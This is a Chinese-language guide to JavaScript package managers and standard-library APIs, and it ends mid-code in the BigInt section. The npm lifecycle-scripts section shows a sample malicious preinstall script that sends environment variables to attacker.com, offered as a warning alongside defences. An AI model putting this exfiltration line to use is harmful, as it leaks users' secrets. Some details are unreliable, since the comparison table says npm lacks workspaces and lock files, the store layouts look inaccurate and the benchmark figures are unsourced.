---
last-updated: 2026-04-27
review-cycle: 6 months
next-review: 2026-10-27
status: current
---
# JavaScript 包管理与标准库权威指南

> 本文档全面梳理 JavaScript 生态中的包管理器机制与标准库 API，提供形式化论证、性能分析和最佳实践。

---

## 目录

- [JavaScript 包管理与标准库权威指南](#javascript-包管理与标准库权威指南)
  - [目录](#目录)
  - [1. 包管理器深度对比](#1-包管理器深度对比)
    - [1.1 包管理器概览](#11-包管理器概览)
    - [1.2 npm 深度解析](#12-npm-深度解析)
      - [1.2.1 架构设计](#121-架构设计)
      - [1.2.2 package-lock.json 机制](#122-package-lockjson-机制)
      - [1.2.3 Workspaces 机制](#123-workspaces-机制)
      - [1.2.4 生命周期脚本](#124-生命周期脚本)
    - [1.3 Yarn 深度解析](#13-yarn-深度解析)
      - [1.3.1 Yarn Classic (v1) 特性](#131-yarn-classic-v1-特性)
      - [1.3.2 Yarn Berry (v2+) 革命性变化](#132-yarn-berry-v2-革命性变化)
      - [1.3.3 Yarn Constraints（约束系统）](#133-yarn-constraints约束系统)
    - [1.4 pnpm 深度解析](#14-pnpm-深度解析)
      - [1.4.1 内容可寻址存储（CAS）](#141-内容可寻址存储cas)
      - [1.4.2 硬链接与符号链接策略](#142-硬链接与符号链接策略)
      - [1.4.3 依赖提升控制](#143-依赖提升控制)
    - [1.5 Bun 深度解析](#15-bun-深度解析)
      - [1.5.1 性能优化架构](#151-性能优化架构)
      - [1.5.2 内置 Bundler](#152-内置-bundler)
      - [1.5.3 Node.js 兼容性](#153-nodejs-兼容性)
    - [1.6 依赖解析算法对比](#16-依赖解析算法对比)
      - [1.6.1 语义化版本解析](#161-语义化版本解析)
      - [1.6.2 冲突解决策略对比](#162-冲突解决策略对比)
  - [2. ECMAScript 标准库](#2-ecmascript-标准库)
    - [2.1 全局对象](#21-全局对象)
      - [2.1.1 Object - 对象操作核心](#211-object---对象操作核心)
      - [2.1.2 Array - 数组操作](#212-array---数组操作)
      - [2.1.3 String - 字符串操作](#213-string---字符串操作)
      - [2.1.4 Symbol - 唯一标识符](#214-symbol---唯一标识符)
      - [2.1.5 BigInt - 大整数运算](#215-bigint---大整数运算)
    - [2.2 集合类型](#22-集合类型)
      - [2.2.1 Map vs Object 性能对比](#221-map-vs-object-性能对比)
      - [2.2.2 Set 去重与集合运算](#222-set-去重与集合运算)
      - [2.2.3 WeakMap / WeakSet - 弱引用集合](#223-weakmap--weakset---弱引用集合)
    - [2.3 结构化克隆](#23-结构化克隆)
      - [2.3.1 structuredClone 深度解析](#231-structuredclone-深度解析)
    - [2.4 迭代器协议](#24-迭代器协议)
      - [2.4.1 Iterator Protocol 形式化](#241-iterator-protocol-形式化)
      - [2.4.2 Generator 函数](#242-generator-函数)
      - [2.4.3 异步迭代器](#243-异步迭代器)
    - [2.5 反射与代理](#25-反射与代理)
      - [2.5.1 Reflect API](#251-reflect-api)
      - [2.5.2 Proxy 陷阱完整列表](#252-proxy-陷阱完整列表)
      - [2.5.3 实际应用模式](#253-实际应用模式)
    - [2.6 国际化 API (Intl)](#26-国际化-api-intl)
      - [2.6.1 Intl 完整生态](#261-intl-完整生态)
      - [2.6.2 性能优化：复用 Intl 实例](#262-性能优化复用-intl-实例)
  - [3. Web APIs 标准库](#3-web-apis-标准库)
    - [3.1 Fetch API](#31-fetch-api)
      - [3.1.1 完整请求生命周期](#311-完整请求生命周期)
      - [3.1.2 高级用法与陷阱](#312-高级用法与陷阱)
      - [3.1.3 常见陷阱](#313-常见陷阱)
    - [3.2 Streams API](#32-streams-api)
      - [3.2.1 流架构模型](#321-流架构模型)
      - [3.2.2 完整示例](#322-完整示例)
      - [3.2.3 性能对比](#323-性能对比)
    - [3.3 Web Workers](#33-web-workers)
      - [3.3.1 Worker 类型对比](#331-worker-类型对比)
      - [3.3.2 Dedicated Worker 完整示例](#332-dedicated-worker-完整示例)
      - [3.3.3 线程池实现](#333-线程池实现)
      - [3.3.4 Shared Worker](#334-shared-worker)
    - [3.4 Service Workers](#34-service-workers)
      - [3.4.1 生命周期](#341-生命周期)
      - [3.4.2 完整 Service Worker 实现](#342-完整-service-worker-实现)
      - [3.4.3 注册与通信](#343-注册与通信)
    - [3.5 Storage APIs](#35-storage-apis)
      - [3.5.1 存储类型对比](#351-存储类型对比)
      - [3.5.2 localStorage / sessionStorage](#352-localstorage--sessionstorage)
      - [3.5.3 IndexedDB 完整封装](#353-indexeddb-完整封装)
    - [3.6 WebSocket](#36-websocket)
      - [3.6.1 完整客户端实现](#361-完整客户端实现)
      - [3.6.2 WebSocket vs HTTP 对比](#362-websocket-vs-http-对比)
    - [3.7 Performance API](#37-performance-api)
      - [3.7.1 性能时间线](#371-性能时间线)
      - [3.7.2 性能观察器](#372-性能观察器)
      - [3.7.3 性能预算监控](#373-性能预算监控)
    - [3.8 Observer APIs](#38-observer-apis)
      - [3.8.1 Intersection Observer（可见性观察）](#381-intersection-observer可见性观察)
      - [3.8.2 Mutation Observer（DOM 变化观察）](#382-mutation-observerdom-变化观察)
      - [3.8.3 Resize Observer（尺寸变化观察）](#383-resize-observer尺寸变化观察)
  - [4. 最佳实践与性能优化](#4-最佳实践与性能优化)
    - [4.1 包管理器最佳实践](#41-包管理器最佳实践)
      - [4.1.1 依赖版本锁定策略](#411-依赖版本锁定策略)
      - [4.1.2 Monorepo 工作区配置](#412-monorepo-工作区配置)
      - [4.1.3 依赖安全审计](#413-依赖安全审计)
    - [4.2 ECMAScript 性能优化](#42-ecmascript-性能优化)
      - [4.2.1 对象操作优化](#421-对象操作优化)
      - [4.2.2 数组性能优化](#422-数组性能优化)
      - [4.2.3 函数优化](#423-函数优化)
    - [4.3 Web APIs 性能优化](#43-web-apis-性能优化)
      - [4.3.1 DOM 操作优化](#431-dom-操作优化)
      - [4.3.2 网络请求优化](#432-网络请求优化)
    - [4.4 常见陷阱与反模式](#44-常见陷阱与反模式)
      - [4.4.1 内存泄漏陷阱](#441-内存泄漏陷阱)
      - [4.4.2 异步陷阱](#442-异步陷阱)
  - [5. 形式化论证与总结](#5-形式化论证与总结)
    - [5.1 包管理器确定性定理](#51-包管理器确定性定理)
    - [5.2 模块解析算法复杂度](#52-模块解析算法复杂度)
    - [5.3 JavaScript 引擎优化假设](#53-javascript-引擎优化假设)
  - [附录](#附录)
    - [A. 快速参考表](#a-快速参考表)
      - [包管理器命令对比](#包管理器命令对比)
      - [ECMAScript 版本特性](#ecmascript-版本特性)
  - [参考资源](#参考资源)

---

## 1. 包管理器深度对比

### 1.1 包管理器概览

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        JavaScript 包管理器演进                           │
├─────────────┬─────────────┬─────────────┬─────────────┬─────────────────┤
│   npm       │    yarn     │   yarn 2+   │    pnpm     │      bun        │
│  (2010)     │   (2016)    │   (2020)    │   (2017)    │    (2022)       │
├─────────────┼─────────────┼─────────────┼─────────────┼─────────────────┤
│ node_modules│ node_modules│    .pnp.*   │ node_modules│  node_modules   │
│  嵌套/扁平  │  扁平化     │  Plug'n'Play│  硬链接存储 │  全局缓存+硬链接│
├─────────────┼─────────────┼─────────────┼─────────────┼─────────────────┤
│ 无workspace │ workspace   │ workspace   │ workspace   │ workspace       │
├─────────────┼─────────────┼─────────────┼─────────────┼─────────────────┤
│ 无lock文件  │ yarn.lock   │ yarn.lock   │ pnpm-lock   │ bun.lockb       │
└─────────────┴─────────────┴─────────────┴─────────────┴─────────────────┘
```

---

### 1.2 npm 深度解析

#### 1.2.1 架构设计

npm 采用**三层架构模型**：

```
┌─────────────────────────────────────────────┐
│              npm CLI (命令层)                │
├─────────────────────────────────────────────┤
│           npm-registry-fetch                 │
│         (HTTP 客户端 + 认证层)               │
├─────────────────────────────────────────────┤
│              pacote (包获取)                 │
│    ┌──────────┬──────────┬──────────┐       │
│    │ npm-pack │git fetch │ 远程tar  │       │
│    └──────────┴──────────┴──────────┘       │
├─────────────────────────────────────────────┤
│           @npmcli/arborist                   │
│        (依赖树解析 + 冲突解决)               │
├─────────────────────────────────────────────┤
│           node_modules (存储层)              │
└─────────────────────────────────────────────┘
```

#### 1.2.2 package-lock.json 机制

**形式化定义**：

```typescript
interface PackageLock {
  name: string;
  version: string;
  lockfileVersion: 1 | 2 | 3;  // v3 是 npm 7+ 的默认格式
  packages: {                    // v3 格式：扁平化存储
    "": RootPackage;
    [path: string]: PackageEntry;
  };
  dependencies?: {               // v1/v2 格式：嵌套存储
    [name: string]: LockDependency;
  };
}

interface PackageEntry {
  version: string;
  resolved: string;              // 精确的 tarball URL
  integrity: string;             // 内容哈希 (sha512-xxx)
  dev?: boolean;
  optional?: boolean;
  dependencies?: { [name: string]: string };
  engines?: { node?: string; npm?: string };
}
```

**lockfileVersion 演进对比**：

| 版本 | npm 版本 | 结构 | 特点 |
|------|----------|------|------|
| v1 | 5.x | 嵌套 `dependencies` | 与 node_modules 结构一致 |
| v2 | 7.x | 混合结构 | 兼容 v1，增加 `packages` |
| v3 | 7.x+ | 扁平 `packages` | 更小体积，更快解析 |

**关键算法 - 确定性安装**：

```javascript
// 伪代码：npm 的确定性安装算法
function deterministicInstall(packageLock) {
  const installed = new Map();

  // 1. 按字母顺序处理包（确保确定性）
  const sortedPackages = Object.entries(packageLock.packages)
    .sort(([a], [b]) => a.localeCompare(b));

  for (const [path, pkg] of sortedPackages) {
    // 2. 验证完整性
    const tarball = fetch(pkg.resolved);
    const actualHash = sha512(tarball);
    assert(actualHash === pkg.integrity, 'Integrity check failed');

    // 3. 安装到精确路径
    const targetPath = join(nodeModules, path);
    extract(tarball, targetPath);
    installed.set(path, pkg);
  }

  return installed;
}
```

#### 1.2.3 Workspaces 机制

**配置示例**：

```json
{
  "name": "monorepo-root",
  "workspaces": [
    "packages/*",
    "apps/*"
  ],
  "devDependencies": {
    "typescript": "^5.0.0"
  }
}
```

**符号链接结构**：

```
monorepo-root/
├── node_modules/
│   ├── typescript -> ../.store/typescript@5.0.0  (提升的公共依赖)
│   ├── @scope/
│   │   ├── pkg-a -> ../../packages/pkg-a         (workspace 符号链接)
│   │   └── pkg-b -> ../../packages/pkg-b
│   └── lodash -> ../.store/lodash@4.17.21
├── packages/
│   ├── pkg-a/
│   │   ├── node_modules/
│   │   │   └── lodash -> ../../../node_modules/lodash  (复用根依赖)
│   │   └── package.json
│   └── pkg-b/
└── package.json
```

**形式化论证 - Workspaces 依赖解析**：

```
定理：Workspaces 的依赖解析是确定性的

前提：
- 设 W = {w₁, w₂, ..., wₙ} 为 workspace 集合
- 设 D(w) 为 workspace w 的依赖集合
- 设 hoist(d) 表示依赖 d 是否可提升到根

证明：
1. 对于每个 d ∈ D(wᵢ) ∩ D(wⱼ) 且版本兼容，hoist(d) = true
2. 根 node_modules 包含所有 hoist(d) = true 的依赖
3. 对于 d ∈ D(w) 且 hoist(d) = false，安装在 w 的本地 node_modules
4. 由于版本范围和 lock 文件是确定的，解析结果唯一
∴ 依赖解析是确定性的
```

#### 1.2.4 生命周期脚本

**执行顺序（形式化）**：

```
安装阶段：
  preinstall → install → postinstall

发布阶段：
  prepublishOnly → prepack → prepare → postpack → publish → postpublish

运行阶段：
  pre<name> → <name> → post<name>

特殊脚本：
  npm restart: stop → restart → start
  npm test: pretest → test → posttest
```

**安全陷阱示例**：

```json
{
  "name": "malicious-pkg",
  "scripts": {
    "preinstall": "curl https://attacker.com/steal?data=$(env)"
  }
}
```

**防护措施**：

```bash
# 1. 使用 --ignore-scripts 跳过生命周期脚本
npm install --ignore-scripts

# 2. 配置 npm 只允许特定脚本
npm config set ignore-scripts true

# 3. 使用 npm-audit 检查
npm audit
```

---

### 1.3 Yarn 深度解析

#### 1.3.1 Yarn Classic (v1) 特性

**扁平化依赖算法**：

```javascript
// Yarn v1 的扁平化算法核心
function hoistDependencies(tree) {
  const hoisted = new Map();
  const conflicts = [];

  function visit(node, path) {
    for (const [name, dep] of node.dependencies) {
      const existing = hoisted.get(name);

      if (!existing) {
        // 首次遇到，提升到根
        hoisted.set(name, dep);
      } else if (satisfies(existing.version, dep.range)) {
        // 版本兼容，复用已提升的依赖
        continue;
      } else {
        // 版本冲突，保持嵌套
        conflicts.push({ name, path, versions: [existing.version, dep.version] });
        node.keepNested(name);
      }
    }
  }

  visit(tree, []);
  return { hoisted, conflicts };
}
```

#### 1.3.2 Yarn Berry (v2+) 革命性变化

**Plug'n'Play (PnP) 机制**：

```
传统 node_modules 方式：
  require('lodash') → fs 遍历 node_modules → 找到 lodash/index.js

PnP 方式：
  require('lodash') → 查询 .pnp.cjs 映射表 → 直接定位虚拟路径
```

**.pnp.cjs 结构**：

```javascript
// .pnp.cjs - 生成的依赖映射表
const packageRegistry = new Map([
  ["lodash", new Map([
    ["npm:4.17.21", {
      packageLocation: "./.yarn/cache/lodash-npm-4.17.21-...zip/node_modules/lodash/",
      packageDependencies: new Map([
        ["lodash", "npm:4.17.21"],
      ]),
    }]
  ])]
]);

// 运行时拦截 require
const originalModuleLoad = Module._load;
Module._load = function(request, parent) {
  const resolution = resolveToUnqualified(request, parent.filename);
  return originalModuleLoad(resolution, parent);
};
```

**Zero-Installs 原理**：

```
传统方式：
  git clone → npm install (下载所有依赖) → 运行

Zero-Installs：
  git clone (包含 .yarn/cache 中的压缩包) → 直接运行

优势：
- 依赖作为 blob 存储在 Git
- CI/CD 无需网络下载
- 完全可重现的构建
```

**配置示例**：

```yaml
# .yarnrc.yml
nodeLinker: pnp              # 或 node-modules
pnpMode: strict              # strict | loose
compressionLevel: mixed      # 压缩级别
enableGlobalCache: true      # 全局缓存

# Zero-Installs 配置
cacheFolder: ./.yarn/cache
enableImmutableInstalls: true
```

#### 1.3.3 Yarn Constraints（约束系统）

**形式化约束定义**：

```prolog
% constraints.pro - Yarn 约束文件

% 强制所有 workspace 使用相同版本的 React
gen_enforced_dependency(WorkspaceCwd, 'react', Version, _) :-
  workspace(WorkspaceCwd),
  workspace_ident(_, 'react', Version).

% 禁止依赖某些包
gen_invalid_dependency(WorkspaceCwd, 'lodash', _, _) :-
  workspace(WorkspaceCwd),
  \+ workspace_ident(WorkspaceCwd, 'legacy-utils', _).

% 强制引擎版本
gen_enforced_field(WorkspaceCwd, 'engines.node', '>=18.0.0') :-
  workspace(WorkspaceCwd).
```

**约束类型**：

| 约束 | 用途 |
|------|------|
| `gen_enforced_dependency` | 强制依赖版本 |
| `gen_invalid_dependency` | 禁止特定依赖 |
| `gen_enforced_field` | 强制 package.json 字段 |
| `gen_broken_dependency` | 标记不兼容依赖 |

---

### 1.4 pnpm 深度解析

#### 1.4.1 内容可寻址存储（CAS）

**核心架构**：

```
全局存储（~/.pnpm-store/）
├── v3/
│   ├── files/                    # 内容寻址的文件存储
│   │   ├── 00/                   # 前两位哈希作为目录
│   │   │   └── abcdef1234...     # 文件内容哈希
│   │   └── ...
│   └── metadata/                 # 包元数据
│
项目 node_modules/
├── .pnpm/                        # 虚拟存储（virtual store）
│   ├── lodash@4.17.21/
│   │   └── node_modules/
│   │       └── lodash -> ../../../.store/lodash@4.17.21  (硬链接)
│   └── react@18.2.0/
│       └── node_modules/
│           └── react -> ../../../.store/react@18.2.0
├── lodash -> ./.pnpm/lodash@4.17.21/node_modules/lodash  (符号链接)
└── react -> ./.pnpm/react@18.2.0/node_modules/react
```

**形式化存储模型**：

```
定义：
- 设 F 为文件内容空间
- 设 H: F → {0,1}^256 为 SHA-256 哈希函数
- 设 Store = { (H(f), f) | f ∈ F }

存储操作：
1. 存储文件：store(f) = (H(f), f) → Store
2. 检索文件：fetch(h) = f where (h, f) ∈ Store
3. 创建硬链接：link(h, path) = hardlink(Store[h], path)

性质：
- 去重：∀f₁,f₂ ∈ F, f₁ = f₂ ⟹ H(f₁) = H(f₂)
- 完整性：∀(h,f) ∈ Store, H(f) = h
```

#### 1.4.2 硬链接与符号链接策略

```bash
# 查看 pnpm 的链接结构
$ ls -la node_modules/
lrwxrwxrwx 1 user user 32 Jan  1 00:00 lodash -> .pnpm/lodash@4.17.21/node_modules/lodash

$ ls -la node_modules/.pnpm/lodash@4.17.21/node_modules/
lrwxrwxrwx 1 user user 45 Jan  1 00:00 lodash -> ../../../.store/lodash@4.17.21/node_modules/lodash

# 硬链接计数（inode 相同）
$ stat ~/.pnpm-store/v3/files/00/abcdef1234...
  File: ...
  Size: 1234       Blocks: 8          IO Block: 4096   regular file
  Links: 15        # 被 15 个包引用
```

**非扁平化结构的优势**：

```
npm/yarn 扁平化：
  node_modules/
  ├── lodash/          # 版本 4.17.21
  ├── react/           # 版本 18.2.0
  └── package-a/       # 依赖 lodash ^4.17.0

  问题：package-b 依赖 lodash ^3.0.0 会冲突

pnpm 非扁平化：
  node_modules/
  ├── .pnpm/
  │   ├── lodash@4.17.21/
  │   ├── lodash@3.10.1/
  │   ├── package-a/   # 依赖 lodash@4.17.21
  │   └── package-b/   # 依赖 lodash@3.10.1
  ├── package-a -> .pnpm/package-a/node_modules/package-a
  └── package-b -> .pnpm/package-b/node_modules/package-b

  优势：每个包有自己的依赖作用域
```

#### 1.4.3 依赖提升控制

**.npmrc 配置**：

```ini
# 完全禁用依赖提升
shamefully-hoist=false

# 选择性提升特定包
public-hoist-pattern[]=*types*
public-hoist-pattern[]=*eslint*
public-hoist-pattern[]=@prettier/plugin-*

# 严格依赖（不允许访问未声明的依赖）
strict-peer-dependencies=true

# 自动安装 peer dependencies
auto-install-peers=true
```

**依赖提升决策矩阵**：

| 场景 | 配置 | 结果 |
|------|------|------|
| 完全隔离 | `shamefully-hoist=false` | 每个包只能访问自己的依赖 |
| 工具类提升 | `public-hoist-pattern[]=*eslint*` | ESLint 插件可被全局访问 |
| 完全扁平 | `shamefully-hoist=true` | 类似 npm 的行为 |

---

### 1.5 Bun 深度解析

#### 1.5.1 性能优化架构

```
┌─────────────────────────────────────────────────────────────┐
│                      Bun 架构                                │
├─────────────────────────────────────────────────────────────┤
│  JavaScriptCore (JSC) - 非 V8，启动更快                      │
├─────────────────────────────────────────────────────────────┤
│  Zig 编写的运行时 - 内存管理优化                              │
├─────────────────────────────────────────────────────────────┤
│  内置 Bundler - 无需 webpack/esbuild                         │
├─────────────────────────────────────────────────────────────┤
│  SQLite/FFI/WebSocket 内置支持                               │
├─────────────────────────────────────────────────────────────┤
│  全局缓存 ~/.bun/install/cache                              │
└─────────────────────────────────────────────────────────────┘
```

**性能对比数据**：

| 操作 | npm | yarn | pnpm | bun |
|------|-----|------|------|-----|
| 冷安装 (create-react-app) | 45s | 38s | 22s | 8s |
| 热安装 (有 lock) | 12s | 10s | 5s | 2s |
| 运行简单脚本 | 200ms | 180ms | 180ms | 15ms |
| 内存占用 | 450MB | 400MB | 250MB | 80MB |

#### 1.5.2 内置 Bundler

```javascript
// bun.build() API - 程序化打包
import { build } from 'bun';

const result = await build({
  entrypoints: ['./src/index.ts'],
  outdir: './dist',
  target: 'browser',      // 'browser' | 'bun' | 'node'
  format: 'esm',          // 'esm' | 'cjs' | 'iife'
  splitting: true,        // 代码分割
  sourcemap: 'external',  // 源码映射
  minify: {
    whitespace: true,
    identifiers: true,
    syntax: true,
  },
  loader: {
    '.svg': 'dataurl',
    '.png': 'file',
  },
});

console.log(`打包完成: ${result.outputs.length} 个文件`);
```

**bun.lockb 二进制格式**：

```
优势：
- 解析速度比 JSON/YAML 快 10-100 倍
- 更小的文件体积
- 内置校验和

劣势：
- 不可读（需要 bun.lockb --print 查看）
- Git 差异不友好
```

#### 1.5.3 Node.js 兼容性

**兼容性矩阵**：

| API | 支持状态 | 备注 |
|-----|----------|------|
| fs/promises | ✅ 完全支持 | |
| http/https | ✅ 完全支持 | |
| stream | ✅ 完全支持 | |
| crypto | ⚠️ 部分支持 | 部分算法差异 |
| child_process | ✅ 完全支持 | |
| worker_threads | ✅ 完全支持 | |
| vm | ⚠️ 部分支持 | 与 V8 行为差异 |
| domain | ❌ 不支持 | 已废弃 |

**兼容性检测**：

```javascript
// runtime-detection.js
const isBun = typeof Bun !== 'undefined';
const isNode = typeof process !== 'undefined' && process.versions?.node;
const isDeno = typeof Deno !== 'undefined';

// 条件使用 Bun 特有 API
if (isBun) {
  // 使用 Bun 的高性能 API
  const file = Bun.file('./data.txt');
  const content = await file.text();
} else {
  // 使用标准 Node API
  const fs = require('fs/promises');
  const content = await fs.readFile('./data.txt', 'utf-8');
}
```

---

### 1.6 依赖解析算法对比

#### 1.6.1 语义化版本解析

**版本范围语义形式化**：

```
版本格式：MAJOR.MINOR.PATCH[-PRERELEASE][+BUILD]

范围表达式：
- ^1.2.3 := >=1.2.3 <2.0.0    (兼容主要版本)
- ~1.2.3 := >=1.2.3 <1.3.0    (兼容次要版本)
- 1.2.x := >=1.2.0 <1.3.0     (通配次要版本)
- >=1.0.0 <2.0.0              (范围组合)
- 1.2.3 || 2.0.0              (多版本选择)

预发布版本规则：
- 1.2.3-alpha < 1.2.3-alpha.1 < 1.2.3-beta < 1.2.3
- ^1.2.3-alpha 不匹配 1.2.4-alpha（预发布版本范围更严格）
```

**版本解析算法**：

```javascript
// SAT 求解器风格的依赖解析
function resolveDependencies(constraints) {
  const solution = new Map();
  const conflicts = [];

  function backtrack(remaining, current) {
    if (remaining.length === 0) {
      return current;  // 找到解
    }

    const [pkg, ranges] = remaining[0];
    const candidates = getAllVersions(pkg)
      .filter(v => ranges.every(r => satisfies(v, r)))
      .sort((a, b) => compareVersions(b, a));  // 优先最新版本

    for (const version of candidates) {
      const newCurrent = new Map(current);
      newCurrent.set(pkg, version);

      // 传播约束
      const newRanges = propagateConstraints(remaining.slice(1), pkg, version);

      const result = backtrack(newRanges, newCurrent);
      if (result) return result;
    }

    return null;  // 无解
  }

  return backtrack(Object.entries(constraints), solution);
}
```

#### 1.6.2 冲突解决策略对比

| 策略 | npm | yarn | pnpm | 说明 |
|------|-----|------|------|------|
| 嵌套安装 | ✅ v1-v2 | ✅ | ✅ | 冲突版本各自安装 |
| 扁平化 | ✅ v3+ | ✅ v1 | ❌ | 尽量提升到根 |
| 依赖重复 | 自动 | 自动 | 避免 | 相同版本只存一份 |
| peer deps | 自动安装 | 警告 | 严格 | 处理 peer 依赖 |

**钻石依赖问题**：

```
      App
     /   \
    A     B
     \   /
      C

场景：A 依赖 C@1.0.0，B 依赖 C@2.0.0

npm/yarn v1 解决方案：
  node_modules/
  ├── A/
  │   └── node_modules/
  │       └── C@1.0.0/    (嵌套)
  ├── B/
  │   └── node_modules/
  │       └── C@2.0.0/    (嵌套)
  └── C@2.0.0/            (扁平化，B 的版本)

pnpm 解决方案：
  node_modules/
  ├── .pnpm/
  │   ├── C@1.0.0/
  │   ├── C@2.0.0/
  │   ├── A/ (依赖 C@1.0.0)
  │   └── B/ (依赖 C@2.0.0)
  ├── A -> .pnpm/A
  └── B -> .pnpm/B
```

---

## 2. ECMAScript 标准库

### 2.1 全局对象

#### 2.1.1 Object - 对象操作核心

**属性描述符形式化**：

```typescript
interface PropertyDescriptor {
  value?: any;           // 属性值
  writable?: boolean;    // 是否可写
  enumerable?: boolean;  // 是否可枚举
  configurable?: boolean;// 是否可配置
  get?(): any;           // getter
  set?(v: any): void;    // setter
}

// 属性描述符组合
{
  data: { value, writable, enumerable, configurable },
  accessor: { get, set, enumerable, configurable }
}
```

**核心方法性能对比**：

```javascript
const obj = { a: 1, b: 2, c: 3 };
const largeObj = Object.fromEntries(Array(10000).fill(0).map((_, i) => [`key${i}`, i]));

// 1. 属性枚举
console.time('for-in');
for (const key in largeObj) {}  // 包含原型链属性，需要 hasOwnProperty 检查
console.timeEnd('for-in');

console.time('Object.keys');
const keys = Object.keys(largeObj);  // 只返回自有可枚举属性
console.timeEnd('Object.keys');

console.time('Object.entries');
const entries = Object.entries(largeObj);  // 键值对数组
console.timeEnd('Object.entries');

console.time('Reflect.ownKeys');
const allKeys = Reflect.ownKeys(largeObj);  // 包含不可枚举和 Symbol
console.timeEnd('Reflect.ownKeys');

// 性能结果（V8）：
// for-in: ~0.5ms
// Object.keys: ~0.3ms
// Object.entries: ~0.4ms
// Reflect.ownKeys: ~0.2ms
```

**Object.create 原型链操作**：

```javascript
// 形式化原型链创建
const proto = { greet() { return 'Hello'; } };

// 1. 纯原型对象（无属性）
const obj1 = Object.create(proto);
// obj1 → proto → Object.prototype → null

// 2. 带属性描述符的对象
const obj2 = Object.create(proto, {
  name: {
    value: 'Alice',
    writable: true,
    enumerable: true,
    configurable: true
  },
  age: {
    value: 25,
    writable: false,  // 只读
    enumerable: false // 不可枚举
  }
});

// 3. 创建无原型对象（字典模式）
const dict = Object.create(null);
// dict → null（无 toString 等方法污染）

// 陷阱：Object.create(null) 没有 hasOwnProperty
const safeDict = Object.create(null);
// safeDict.hasOwnProperty('key'); // TypeError!
Object.prototype.hasOwnProperty.call(safeDict, 'key'); // ✅ 正确
```

#### 2.1.2 Array - 数组操作

**时间复杂度分析**：

| 方法 | 时间复杂度 | 空间复杂度 | 说明 |
|------|------------|------------|------|
| push/pop | O(1) amortized | O(1) | 动态数组扩容 |
| shift/unshift | O(n) | O(n) | 需要移动元素 |
| concat | O(m+n) | O(m+n) | 创建新数组 |
| slice | O(k) | O(k) | k = end - start |
| splice | O(n) | O(n) | 插入/删除 |
| indexOf | O(n) | O(1) | 线性搜索 |
| includes | O(n) | O(1) | 线性搜索 |
| find | O(n) | O(1) | 线性搜索 |
| sort | O(n log n) | O(log n) | Timsort (V8) |
| map/filter/reduce | O(n) | O(n) | 遍历 |

**高效数组操作模式**：

```javascript
// 1. 避免在循环中使用 shift/unshift
// ❌ 低效：O(n²)
const queue = [1, 2, 3, 4, 5];
while (queue.length > 0) {
  const item = queue.shift();  // 每次 O(n)
  process(item);
}

// ✅ 高效：使用索引模拟队列 O(n)
const queue2 = [1, 2, 3, 4, 5];
let head = 0;
while (head < queue2.length) {
  const item = queue2[head++];
  process(item);
}

// 2. 预分配数组容量
// ❌ 动态扩容
const arr1 = [];
for (let i = 0; i < 10000; i++) {
  arr1.push(i);  // 多次扩容：4→8→16→...
}

// ✅ 预分配
const arr2 = new Array(10000);
for (let i = 0; i < 10000; i++) {
  arr2[i] = i;  // 无扩容开销
}

// 3. 使用 TypedArray 处理数值
// ❌ 普通数组存储数字
const numbers1 = new Array(1000000).fill(0).map((_, i) => i);
// 内存：~32MB（每个数字是对象引用）

// ✅ TypedArray
const numbers2 = new Int32Array(1000000);
for (let i = 0; i < 1000000; i++) numbers2[i] = i;
// 内存：~4MB（连续内存）
```

**数组方法链式优化**：

```javascript
const data = Array(100000).fill(0).map((_, i) => ({ id: i, value: i * 2 }));

// ❌ 多次遍历
const result1 = data
  .filter(x => x.value > 100)
  .map(x => x.value * 2)
  .reduce((a, b) => a + b, 0);
// 遍历次数：3 次

// ✅ 单次 reduce
const result2 = data.reduce((sum, x) => {
  if (x.value > 100) {
    return sum + x.value * 2;
  }
  return sum;
}, 0);
// 遍历次数：1 次

// ✅ 使用 for...of（最快）
let result3 = 0;
for (const x of data) {
  if (x.value > 100) {
    result3 += x.value * 2;
  }
}
```

#### 2.1.3 String - 字符串操作

**不可变性与性能**：

```javascript
// 字符串不可变性证明
const str = 'hello';
str[0] = 'H';  // 静默失败（严格模式报错）
console.log(str);  // 'hello'

// 字符串拼接性能对比
console.time('+=');
let s1 = '';
for (let i = 0; i < 100000; i++) {
  s1 += i;  // O(n²) - 每次创建新字符串
}
console.timeEnd('+=');

console.time('array-join');
const parts = [];
for (let i = 0; i < 100000; i++) {
  parts.push(i);  // O(1) amortized
}
const s2 = parts.join('');  // O(n)
console.timeEnd('array-join');

// 结果：array-join 快 10-100 倍
```

**正则表达式优化**：

```javascript
// ❌ 在循环中编译正则
for (const str of strings) {
  const match = str.match(/\d+/g);  // 每次重新编译
}

// ✅ 预编译正则
const digitRegex = /\d+/g;
for (const str of strings) {
  const match = str.match(digitRegex);  // 复用编译结果
}

// 回溯陷阱（ReDoS）
// ❌ 危险：指数级回溯
const dangerous = /(a+)+$/;
dangerous.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!');  // 卡死

// ✅ 安全：限制回溯
const safe = /^a+$/;
```

#### 2.1.4 Symbol - 唯一标识符

**Well-Known Symbols**：

```javascript
// 1. Symbol.iterator - 使对象可迭代
const range = {
  from: 1,
  to: 5,
  [Symbol.iterator]() {
    let current = this.from;
    const last = this.to;
    return {
      next() {
        if (current <= last) {
          return { done: false, value: current++ };
        }
        return { done: true };
      }
    };
  }
};

console.log([...range]);  // [1, 2, 3, 4, 5]

// 2. Symbol.toPrimitive - 自定义类型转换
const obj = {
  [Symbol.toPrimitive](hint) {
    if (hint === 'number') return 42;
    if (hint === 'string') return 'hello';
    return true;
  }
};

console.log(+obj);       // 42 (hint: 'number')
console.log(`${obj}`);   // 'hello' (hint: 'string')
console.log(obj + '');   // 'true' (hint: 'default')

// 3. Symbol.for / Symbol.keyFor - 全局注册表
const globalSym = Symbol.for('app.shared');  // 创建/获取全局 Symbol
const sameSym = Symbol.for('app.shared');
console.log(globalSym === sameSym);  // true

console.log(Symbol.keyFor(globalSym));  // 'app.shared'
console.log(Symbol.keyFor(Symbol()));   // undefined (非全局)
```

#### 2.1.5 BigInt - 大整数运算

```javascript
// 创建 BigInt
const a = 9007199254740991n;           // 字面量
const b = BigInt('9007199254740991999'); // 字符串转换
const c = BigInt(123);                  // 数字转换

// 运算（不能与 Number 混合）
const sum = a + 1n;      // ✅
// const bad = a + 1;    // ❌ TypeError

// 比较（可以混合比较）
console.log(1n < 2);     // true
console.log(1n === 1);   // false（严格不等，类型不同）
console.log(1n == 1);    // true（宽松相等）

// 陷阱：JSON 序列化
const data = { big: 12345678901234567890n };
JSON.stringify(data);  // ❌ TypeError: BigInt can't serialize

// ✅ 解决方案：自定义序列化
const safeStringify = (obj) => JSON.stringify(obj, (_, v) =>
